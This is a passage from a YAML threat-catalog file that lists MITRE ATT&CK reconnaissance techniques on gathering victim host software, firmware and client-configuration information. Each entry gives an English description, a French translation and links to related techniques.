      to collect host information from visitors.(Citation: ATT ScanBox) Information
      about the installed software may also be exposed to adversaries via online or
      other accessible data sets (ex: job postings, network maps, assessment reports,
      resumes, or purchase invoices). Additionally, adversaries may analyze metadata
      from victim-owned files (e.g., PDFs, DOCs, images, and sound files hosted on
      victim-owned websites) to extract information about the software and hardware
      used to create or process those files. Metadata may reveal software versions,
      configurations, or timestamps that indicate outdated or vulnerable software.
      This information can be cross-referenced with known CVEs to identify potential
      vectors for exploitation in future operations.(Citation: Outpost24)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
      or [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1592/002'
    translations:
      fr:
        name: Logiciels
        description: "Les adversaires peuvent recueillir des informations sur le logiciel\
          \ h\xF4te de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les logiciels install\xE9s peuvent inclure une vari\xE9\
          t\xE9 de d\xE9tails tels que les types et versions sur des h\xF4tes sp\xE9\
          cifiques, ainsi que la pr\xE9sence de composants suppl\xE9mentaires qui\
          \ pourraient indiquer des protections d\xE9fensives suppl\xE9mentaires (ex\
          \ : antivirus, SIEM, etc.).\n\nLes adversaires peuvent recueillir ces informations\
          \ de diff\xE9rentes mani\xE8res, telles que par des actions de collecte\
          \ directe via [Analyse active](https://attack.mitre.org/techniques/T1595)\
          \ (ex : ports d\u2019\xE9coute, banni\xE8res serveur, cha\xEEnes d\u2019\
          agents utilisateurs) ou [Phishing pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ Les adversaires peuvent \xE9galement compromettre les sites et inclure\
          \ du contenu malveillant destin\xE9 \xE0 collecter des informations d\u2019\
          h\xE9bergement aupr\xE8s des visiteurs. (Citation : ATT ScanBox) Les informations\
          \ sur le logiciel install\xE9 peuvent \xE9galement \xEAtre expos\xE9es aux\
          \ adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ donn\xE9es accessibles (ex. : offres d\u2019emploi, cartes r\xE9seau,\
          \ rapports d\u2019\xE9valuation, CV ou factures d\u2019achat). De plus,\
          \ les adversaires peuvent analyser les m\xE9tadonn\xE9es provenant de fichiers\
          \ appartenant aux victimes (par exemple, PDF, TOC, images et fichiers sonores\
          \ h\xE9berg\xE9s sur des sites web appartenant aux victimes) afin d\u2019\
          extraire des informations sur les logiciels et le mat\xE9riel utilis\xE9\
          s pour cr\xE9er ou traiter ces fichiers. Les m\xE9tadonn\xE9es peuvent r\xE9\
          v\xE9ler des versions logicielles, des configurations ou des horodatages\
          \ indiquant un logiciel obsol\xE8te ou vuln\xE9rable. Ces informations peuvent\
          \ \xEAtre recoup\xE9es avec des CVE connus pour identifier des vecteurs\
          \ potentiels \xE0 exploiter lors d\u2019op\xE9rations futures. (Citation\
          \ : Avant-poste 24)\n\nLa collecte de ces informations peut r\xE9v\xE9ler\
          \ d\u2019autres formes de reconnaissance (ex : [Rechercher des sites web/domaines\
          \ ouverts](https://attack.mitre.org/techniques/T1593) ou [Rechercher dans\
          \ des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ pour \xE9tablir des ressources op\xE9rationnelles (ex. : [D\xE9velopper\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou [Obtenir\
          \ des capacit\xE9s](https://attack.mitre.org/techniques/T1588)), et/ou pour\
          \ un acc\xE8s initial (ex : [Cha\xEEne d\u2019approvisionnement compromis](https://attack.mitre.org/techniques/T1195)\
          \ ou [services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)).\n\
          https://attack.mitre.org/techniques/T1592/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.003
    ref_id: T1592.003
    name: Firmware
    description: 'Adversaries may gather information about the victim''s host firmware
      that can be used during targeting. Information about host firmware may include
      a variety of details such as type and versions on specific hosts, which may
      be used to infer more information about hosts in the environment (ex: configuration,
      purpose, age/patch level, etc.).


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about host firmware may only be exposed to adversaries via online or other accessible
      data sets (ex: job postings, network maps, assessment reports, resumes, or purchase
      invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal
      opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195)
      or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).

      https://attack.mitre.org/techniques/T1592/003'
    translations:
      fr:
        name: Micrologiciel
        description: "Les adversaires peuvent recueillir des informations sur le firmware\
          \ h\xF4te de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur le firmware h\xF4te peuvent inclure divers d\xE9\
          tails tels que le type et les versions sur des h\xF4tes sp\xE9cifiques,\
          \ qui peuvent servir \xE0 d\xE9duire davantage d\u2019informations sur les\
          \ h\xF4tes dans l\u2019environnement (par exemple : configuration, objectif,\
          \ \xE2ge/niveau de patch, etc.).\n\nLes adversaires peuvent recueillir ces\
          \ informations de diff\xE9rentes mani\xE8res, comme par l\u2019obtention\
          \ directe via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur le firmware h\xF4te ne peuvent \xEAtre expos\xE9\
          es aux adversaires que via des ensembles de donn\xE9es en ligne ou autres\
          \ donn\xE9es accessibles (ex : offres d\u2019emploi, cartes r\xE9seau, rapports\
          \ d\u2019\xE9valuation, CV ou factures d\u2019achat). (Citation : ArsTechnica\
          \ Intel) La collecte de ces informations peut r\xE9v\xE9ler d\u2019autres\
          \ formes de reconnaissance (ex : [Rechercher dans des sites web/domaines\
          \ ouverts](https://attack.mitre.org/techniques/T1593) ou [Rechercher dans\
          \ des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex. : [D\xE9\
          velopper des capacit\xE9s](https://attack.mitre.org/techniques/T1587) ou\
          \ [Obtenir des capacit\xE9s](https://attack.mitre.org/techniques/T1588)),\
          \ et/ou un acc\xE8s initial (ex : [Cha\xEEne d\u2019approvisionnement Compromise](https://attack.mitre.org/techniques/T1195)\
          \ ou [exploiter une application publique](https://attack.mitre.org/techniques/T1190)).\n\
          https://attack.mitre.org/techniques/T1592/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1592.004
    ref_id: T1592.004
    name: Client Configurations
    description: 'Adversaries may gather information about the victim''s client configurations
      that can be used during targeting. Information about client configurations may
